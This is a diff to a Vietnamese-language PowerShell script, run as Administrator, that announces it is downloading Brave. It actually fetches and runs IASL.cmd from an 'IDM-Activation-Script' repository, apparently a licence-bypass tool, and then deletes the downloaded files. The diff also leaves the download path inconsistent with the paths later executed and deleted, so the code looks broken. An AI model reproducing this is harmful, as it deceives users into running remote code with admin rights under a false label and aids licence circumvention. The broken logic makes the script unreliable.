@@ -2,12 +2,11 @@
 # Chạy với quyền quản trị viên (Run as Administrator)
 
 $Path = $ENV:TEMP
-$Installer = "IASL.cmd"
 
 Write-Host "Dang tai xuong Brave..."
 
 # Tải file cài đặt
-Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/IASL.cmd" -OutFile "$Path\$Installer"
+Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/IASL.cmd" -OutFile "$Path"
 Invoke-WebRequest "https://raw.githubusercontent.com/hiepvk/IDM-Activation-Script/main/src/banner_art.txt" -OutFile "$Path\src"
 
 Write-Host "Da tai xuong thanh cong."
@@ -22,15 +21,9 @@ if ($chkcmd -notcontains "CMD is working") {
 saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" $args""" -Wait
 CheckFile $FilePath
 
-$FilePaths = @("$env:SystemRoot\Temp\IASL.cmd.cmd", "$env:USERPROFILE\AppData\Local\Temp\IASL.cmd.cmd")
+$FilePaths = @("$env:SystemRoot\Temp\IASL.cmd", "$env:USERPROFILE\AppData\Local\Temp\IASL.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
 
 Write-Host "Cai dat hoan tat."
-Write-Host "Dang don dep file cai dat..."
 
-# Delete the downloaded installer file
-Remove-Item "$Path\$Installer" -ErrorAction SilentlyContinue
-
-
-Write-Host "Hoan tat."
 
